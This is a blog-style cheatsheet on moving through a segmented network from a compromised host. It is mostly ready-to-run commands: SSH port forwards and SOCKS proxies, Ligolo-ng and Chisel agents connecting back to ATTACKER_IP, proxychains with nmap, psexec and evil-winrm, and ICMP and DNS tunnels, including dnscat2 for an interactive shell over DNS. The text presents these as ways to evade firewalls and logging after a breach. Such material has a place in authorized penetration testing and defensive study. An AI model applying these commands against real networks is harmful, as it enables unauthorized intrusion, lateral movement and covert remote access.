                    <h1 class="blog-title">Network Pivoting & Tunneling Cheatsheet</h1>
                    <div class="blog-meta">
                        <div class="author">
                            <div class="author-avatar">H</div>
                            <span>hackherway</span>
                        </div>
                        <span>May 20, 2026</span>
                        <span>14 min read</span>
                    </div>
                </article>

                <div class="blog-content">
                    <p id="net-intro">
                        You popped one box in a segmented network and now you need to touch the crown jewels three VLANs away. Every port is filtered, every protocol is inspected, and the firewall logs make the NSA look lazy. Here's how to move through that network like smoke — through tunnels, proxies, and protocols that nobody thinks to block.
                    </p>

                    <h2 id="net-ssh">SSH Tunnels</h2>
                    <p>
                        SSH is the Swiss Army knife of pivoting. Every Linux box has it, every firewall allows it, and it can tunnel literally anything. If you have SSH access to a compromised host, you have a highway into their network.
                    </p>

                    <h3 id="net-local">Local Port Forwarding</h3>
                    <p>
                        Forward a port from the target network to your local machine. Useful when you want to access an internal service (like a web app on port 8080) through a compromised host.
                    </p>
                    <pre><code># Forward target's internal port 8080 to your local port 9090
# You access it via localhost:9090
ssh -L 9090:internal.target:8080 user@compromised.host

# Multiple forwards in one command
ssh -L 9090:web.internal:80 -L 9091:db.internal:3306 user@compromised.host

# Background the tunnel
ssh -fN -L 9090:internal.target:8080 user@compromised.host</code></pre>

                    <h3 id="net-remote">Remote Port Forwarding</h3>
                    <p>
                        Forward a port from your attacker machine to the target network. Useful when the target can't reach you directly but you need to expose a tool (like a payload server) to the target.
                    </p>
                    <pre><code># Forward your local port 4444 to the compromised host's port 4444
# Target can now reach your listener via compromised.host:4444
ssh -R 4444:localhost:4444 user@compromised.host

# Enable GatewayPorts so the forward is accessible from other hosts
ssh -R 0.0.0.0:4444:localhost:4444 user@compromised.host
# (Requires GatewayPorts yes in sshd_config)</code></pre>

                    <h3 id="net-dynamic">Dynamic SOCKS Proxy</h3>
                    <p>
                        Create a SOCKS proxy through the compromised host. Route all your traffic through it with ProxyChains. This is the most flexible pivoting technique.
                    </p>
                    <pre><code># Create SOCKS proxy on local port 1080
ssh -D 1080 user@compromised.host

# Background it
ssh -fN -D 1080 user@compromised.host

# Use with proxychains
proxychains nmap -sT -p 80,443,8080 10.10.10.0/24
proxychains firefox
proxychains impacket-psexec domain/admin@10.10.10.10</code></pre>

                    <h2 id="net-ligolo">Ligolo-ng</h2>
                    <p>
                        Ligolo-ng is the modern replacement for everything. It creates a tun interface, gives you a real network route into the target network, and handles multiple tunnels with ease. It's what Meterpreter's <code>autoroute</code> wishes it was.
                    </p>
                    <pre><code># === ATTACKER MACHINE ===
# Start the Ligolo proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# Add a tun interface for routing
sudo ip tuntap add user YOURUSER mode tun ligolo
sudo ip link set ligolo up

# === COMPROMISED TARGET ===
# Run the agent pointing at your attacker
./agent -connect ATTACKER_IP:11601 -ignore-cert

# === BACK ON ATTACKER ===
# In the Ligolo proxy session, start the tunnel
# Type: session
# Select the session
# Type: start

# Route traffic through the tunnel
sudo ip route add 10.10.10.0/24 dev ligolo

# Now you can directly access 10.10.10.0/24 from your attacker
nmap -sT -p 22,80,443,445,3389 10.10.10.0/24

# Forward a specific port
# In Ligolo proxy: listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp</code></pre>

                    <h2 id="net-chisel">Chisel</h2>
                    <p>
                        Chisel is a fast TCP tunnel over HTTP, secured via SSH. It's great when you only have HTTP outbound and need to punch through restrictive firewalls.
                    </p>
                    <pre><code># === ATTACKER MACHINE ===
# Start the Chisel server
./chisel server -p 8080 --reverse

# === COMPROMISED TARGET ===
# Connect back and create a SOCKS proxy
./chisel client http://ATTACKER_IP:8080 R:socks

# Or forward a specific port
./chisel client http://ATTACKER_IP:8080 R:9090:internal.target:80

# Now on attacker, use the SOCKS proxy on port 1080
# (Chisel tells you which port it opened)
proxychains nmap -sT -p 80,443 10.10.10.0/24

# Multiple forwards
./chisel client http://ATTACKER_IP:8080 R:9090:web.internal:80 R:9091:db.internal:3306</code></pre>

                    <h2 id="net-proxychains">ProxyChains</h2>
                    <p>
                        ProxyChains forces any TCP connection through your proxy. Configure it once, then prefix any command with <code>proxychains</code> and it routes through your tunnel.
                    </p>
                    <pre><code># /etc/proxychains4.conf — add your proxy at the bottom:
[ProxyList]
socks5  127.0.0.1 1080

# Use with any tool
proxychains nmap -sT -Pn -p 22,80,443,445,3389 10.10.10.0/24
proxychains smbclient -L //10.10.10.10
proxychains python3 exploit.py
proxychains curl http://10.10.10.10:8080

# For tools that don't support proxies natively:
proxychains impacket-psexec domain/admin@10.10.10.10
proxychains evil-winrm -i 10.10.10.10 -u admin</code></pre>

                    <h2 id="net-icmp">ICMP Tunneling</h2>
                    <p>
                        When every TCP and UDP port is blocked, ICMP usually still works because ping is "essential." Tools like <code>icmpsh</code> and <code>ptunnel</code> tunnel data through ICMP echo requests and replies.
                    </p>
                    <pre><code># === ATTACKER ===
# Start the icmpsh listener
python icmpsh_m.py ATTACKER_IP TARGET_IP

# === TARGET ===
# Run the icmpsh client (Windows)
icmpsh.exe -t ATTACKER_IP

# === ptunnel for TCP over ICMP ===
# Attacker: sudo ptunnel -p 0.0.0.0 -lp 8888 -da target.internal -dp 22
# Now connect to localhost:8888 to reach target.internal:22

# === pingtunnel (more modern) ===
# Attacker: ./pingtunnel -type server
# Target: ./pingtunnel -type client -l :4455 -s ATTACKER_IP -t ATTACKER_IP:4455
# Forwards target's local port 4455 to attacker's port 4455 over ICMP</code></pre>

                    <h2 id="net-dns">DNS Tunneling</h2>
                    <p>
                        DNS is the last protocol anyone blocks. If you can resolve names, you can tunnel data. It's slow, it's noisy if you don't throttle it, but it works when nothing else does.
                    </p>
                    <pre><code># === iodine ===
# Requires a domain with NS records pointing to your attacker
# Attacker: sudo iodined -f 10.0.0.1 tunnel.yourdomain.com -P yourpassword
# Target: sudo iodine -f tunnel.yourdomain.com -P yourpassword
# Creates a tun interface. Now you have a tunnel.

# === dnscat2 ===
# Attacker: ruby dnscat2.rb yourdomain.com
# Target: ./dnscat2 yourdomain.com
# Interactive shell over DNS

# === dns2tcp ===
# For specific port forwarding over DNS
# Config file defines resources that map to internal services</code></pre>

